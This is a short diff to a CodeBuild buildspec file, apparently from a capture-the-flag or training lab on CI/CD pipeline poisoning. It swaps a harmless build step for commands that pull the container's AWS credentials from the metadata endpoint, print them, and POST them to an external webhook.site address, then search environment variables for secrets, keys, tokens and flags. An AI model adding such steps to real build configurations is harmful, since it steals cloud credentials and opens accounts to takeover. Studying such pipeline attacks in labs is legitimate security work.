@@ -3,6 +3,9 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - echo "Exfiltrating credentials..."
+      - 'curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" > /tmp/creds.json'
+      - 'cat /tmp/creds.json'
+      - 'curl -X POST -H "Content-Type: application/json" -d @/tmp/creds.json https://webhook.site/35018293-c6de-4eda-8fd3-9743352728a9'
+      - echo "Checking environment for secrets..."
+      - env | grep -iE 'secret|flag|key|token' || true
